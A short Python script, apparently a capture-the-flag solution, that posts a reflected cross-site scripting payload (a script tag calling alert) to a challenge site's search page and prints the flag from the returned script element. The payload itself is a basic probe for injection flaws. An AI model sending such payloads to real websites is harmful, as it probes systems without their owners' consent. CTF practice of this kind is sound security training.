from bs4 import BeautifulSoup
import requests

URL = "http://challenges.0x0539.net:3010/search.php"
DATA = {'query' : '<script>alert("1");</script>'}

resp = requests.post(URL, data=DATA)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('script')
flag = pre.contents[0]
print(flag)